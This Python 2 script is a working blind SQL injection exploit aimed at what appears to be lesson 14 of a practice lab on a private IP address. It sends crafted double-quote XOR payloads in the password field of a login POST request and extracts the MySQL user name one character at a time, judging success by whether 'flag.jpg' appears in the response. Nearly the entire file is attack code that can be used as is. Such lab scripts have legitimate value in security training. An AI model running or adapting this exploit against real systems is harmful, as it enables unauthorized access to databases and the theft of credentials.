#!/usr/bin/env python
#encoding=utf-8

'''
POST -Double Injection - Double quotes -String
'''

import urllib,httplib, time, string, sys, random

headers = {'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': ''
}

# payloads
payloads = list(string.ascii_letters) + list(string.digits) + ['@', '_', '.']

# target
host = '10.0.103.130'

print 'Start to retrive MySQL User:'

user = ''

for i in range (1, 30):
    for payload in payloads:
        try:
            s = 'aaaa"XOR(if(ascii(mid(user(),%s,1))=%s,1,0))OR"bb' % (i, ord(payload))
            #param = urllib.urlencode({"uname":'admin', 'passwd': s})
            #print param
            param = "uname=admin&passwd=%s" % urllib.quote(s) 
            conn = httplib.HTTPConnection(host, timeout=4)
            conn.request(method='POST',
                            url = "/Less-14/",
                            body = param,
                            headers = headers
            )
            res = conn.getresponse().read()
            if res.find('flag.jpg') > 0:
                user += payload
                sys.stdout.write('\r[In Progress]' + user)
                sys.stdout.flush()
                print
                break
            conn.close()
        except Exception,e:
            #print e
            #sys.exit()
            pass

print '\n[Done] MySQL user is ' + user
